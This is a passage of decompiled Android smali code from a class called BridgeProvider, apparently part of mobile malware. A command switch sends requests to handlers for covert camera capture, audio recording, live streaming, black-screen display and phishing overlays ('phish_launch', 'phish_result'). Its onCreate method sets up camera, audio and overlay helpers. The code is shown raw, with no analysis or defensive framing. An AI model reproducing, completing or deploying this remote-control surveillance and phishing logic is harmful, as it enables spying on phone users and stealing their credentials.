    const/16 v1, 0x12

    goto/16 :goto_0

    :sswitch_2
    const-string v0, "audio_stop"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_4

    goto/16 :goto_0

    :cond_4
    const/16 v1, 0x11

    goto/16 :goto_0

    :sswitch_3
    const-string v0, "audio_poll"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_5

    goto/16 :goto_0

    :cond_5
    const/16 v1, 0x10

    goto/16 :goto_0

    :sswitch_4
    const-string v0, "blackscreen_show"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_6

    goto/16 :goto_0

    :cond_6
    const/16 v1, 0xf

    goto/16 :goto_0

    :sswitch_5
    const-string v0, "blackscreen_hide"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_7

    goto/16 :goto_0

    :cond_7
    const/16 v1, 0xe

    goto/16 :goto_0

    :sswitch_6
    const-string v0, "phish_result"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_8

    goto/16 :goto_0

    :cond_8
    const/16 v1, 0xd

    goto/16 :goto_0

    :sswitch_7
    const-string v0, "blackscreen_status"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_9

    goto/16 :goto_0

    :cond_9
    const/16 v1, 0xc

    goto/16 :goto_0

    :sswitch_8
    const-string v0, "phish_launch"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_a

    goto/16 :goto_0

    :cond_a
    const/16 v1, 0xb

    goto/16 :goto_0

    :sswitch_9
    const-string v0, "phish_poll"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_b

    goto/16 :goto_0

    :cond_b
    const/16 v1, 0xa

    goto/16 :goto_0

    :sswitch_a
    const-string v0, "phish_hide"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_c

    goto/16 :goto_0

    :cond_c
    const/16 v1, 0x9

    goto/16 :goto_0

    :sswitch_b
    const-string v0, "audio_start"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_d

    goto/16 :goto_0

    :cond_d
    const/16 v1, 0x8

    goto/16 :goto_0

    :sswitch_c
    const-string v0, "overlay_show"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_e

    goto :goto_0

    :cond_e
    const/4 v1, 0x7

    goto :goto_0

    :sswitch_d
    const-string v0, "overlay_hide"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_f

    goto :goto_0

    :cond_f
    const/4 v1, 0x6

    goto :goto_0

    :sswitch_e
    const-string v0, "start_service"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_10

    goto :goto_0

    :cond_10
    const/4 v1, 0x5

    goto :goto_0

    :sswitch_f
    const-string v0, "phish_check"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_11

    goto :goto_0

    :cond_11
    const/4 v1, 0x4

    goto :goto_0

    :sswitch_10
    const-string v0, "ping"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_12

    goto :goto_0

    :cond_12
    const/4 v1, 0x3

    goto :goto_0

    :sswitch_11
    const-string v0, "overlay_status"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_13

    goto :goto_0

    :cond_13
    const/4 v1, 0x2

    goto :goto_0

    :sswitch_12
    const-string v0, "stream_start"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_14

    goto :goto_0

    :cond_14
    const/4 v1, 0x1

    goto :goto_0

    :sswitch_13
    const-string v0, "stop_service"

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_15

    goto :goto_0

    :cond_15
    const/4 v1, 0x0

    :goto_0
    packed-switch v1, :pswitch_data_0

    .line 121
    new-instance p2, Ljava/lang/StringBuilder;

    const-string p3, "unknown: "

    invoke-direct {p2, p3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {p2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Lcom/servers/ozzbzk/BridgeProvider;->err(Ljava/lang/String;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 87
    :pswitch_0
    invoke-direct {p0, p3}, Lcom/servers/ozzbzk/BridgeProvider;->cameraCapture(Landroid/os/Bundle;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 91
    :pswitch_1
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->streamStop()Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 95
    :pswitch_2
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->audioStop()Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 97
    :pswitch_3
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->audioPoll()Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 105
    :pswitch_4
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->blackScreenShow()Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 107
    :pswitch_5
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->blackScreenHide()Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 111
    :pswitch_6
    invoke-direct {p0, p3}, Lcom/servers/ozzbzk/BridgeProvider;->phishResult(Landroid/os/Bundle;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 109
    :pswitch_7
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->blackScreenStatus()Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 115
    :pswitch_8
    invoke-direct {p0, p3}, Lcom/servers/ozzbzk/BridgeProvider;->phishLaunch(Landroid/os/Bundle;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 113
    :pswitch_9
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->phishPoll()Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 119
    :pswitch_a
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->phishHide()Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 93
    :pswitch_b
    invoke-direct {p0, p3}, Lcom/servers/ozzbzk/BridgeProvider;->audioStart(Landroid/os/Bundle;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 99
    :pswitch_c
    invoke-direct {p0, p2, p3}, Lcom/servers/ozzbzk/BridgeProvider;->overlayShow(Ljava/lang/String;Landroid/os/Bundle;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 101
    :pswitch_d
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->overlayHide()Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 83
    :pswitch_e
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->startFg()Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 117
    :pswitch_f
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->phishCheck()Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 81
    :pswitch_10
    invoke-static {}, Lcom/servers/ozzbzk/BridgeProvider;->ok()Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 103
    :pswitch_11
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->overlayStatus()Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 89
    :pswitch_12
    invoke-direct {p0, p3}, Lcom/servers/ozzbzk/BridgeProvider;->streamStart(Landroid/os/Bundle;)Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    .line 85
    :pswitch_13
    invoke-direct {p0}, Lcom/servers/ozzbzk/BridgeProvider;->stopFg()Landroid/os/Bundle;

    move-result-object p1

    return-object p1

    :sswitch_data_0
    .sparse-switch
        -0x46f5ac88 -> :sswitch_13
        -0x40dd291d -> :sswitch_12
        -0x6ecf13f -> :sswitch_11
        0x348172 -> :sswitch_10
        0x165330f -> :sswitch_f
        0x68cafd8 -> :sswitch_e
        0x110583d1 -> :sswitch_d
        0x110a818c -> :sswitch_c
        0x2eca0ab9 -> :sswitch_b
        0x319a325b -> :sswitch_a
        0x319decd8 -> :sswitch_9
        0x3a41968c -> :sswitch_8
        0x42b3a186 -> :sswitch_7
        0x44b63af6 -> :sswitch_6
        0x48c603d6 -> :sswitch_5
        0x48cb0191 -> :sswitch_4
        0x5c57aa88 -> :sswitch_3
        0x5c591acb -> :sswitch_2
        0x61012161 -> :sswitch_1
        0x616a3c2c -> :sswitch_0
    .end sparse-switch

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_13
        :pswitch_12
        :pswitch_11
        :pswitch_10
        :pswitch_f
        :pswitch_e
        :pswitch_d
        :pswitch_c
        :pswitch_b
        :pswitch_a
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method

.method public delete(Landroid/net/Uri;Ljava/lang/String;[Ljava/lang/String;)I
    .locals 0

    const/4 p1, 0x0

    return p1
.end method

.method public getType(Landroid/net/Uri;)Ljava/lang/String;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public insert(Landroid/net/Uri;Landroid/content/ContentValues;)Landroid/net/Uri;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public onCreate()Z
    .locals 2

    .line 59
    invoke-virtual {p0}, Lcom/servers/ozzbzk/BridgeProvider;->getContext()Landroid/content/Context;

    move-result-object v0

    if-eqz v0, :cond_0

    .line 61
    new-instance v1, Lcom/servers/ozzbzk/CameraCaptureHelper;

    invoke-direct {v1, v0}, Lcom/servers/ozzbzk/CameraCaptureHelper;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lcom/servers/ozzbzk/BridgeProvider;->cameraHelper:Lcom/servers/ozzbzk/CameraCaptureHelper;

    .line 62
    new-instance v1, Lcom/servers/ozzbzk/AudioCaptureHelper;

    invoke-direct {v1, v0}, Lcom/servers/ozzbzk/AudioCaptureHelper;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lcom/servers/ozzbzk/BridgeProvider;->audioHelper:Lcom/servers/ozzbzk/AudioCaptureHelper;

    .line 63
    new-instance v1, Lcom/servers/ozzbzk/OverlayHelper;

    invoke-direct {v1, v0}, Lcom/servers/ozzbzk/OverlayHelper;-><init>(Landroid/content/Context;)V

    iput-object v1, p0, Lcom/servers/ozzbzk/BridgeProvider;->overlayHelper:Lcom/servers/ozzbzk/OverlayHelper;

    :cond_0
    const/4 v0, 0x1

    return v0
.end method

.method public query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    .locals 0

    const/4 p1, 0x0

    return-object p1
.end method

.method public update(Landroid/net/Uri;Landroid/content/ContentValues;Ljava/lang/String;[Ljava/lang/String;)I
    .locals 0

    const/4 p1, 0x0

    return p1
.end method
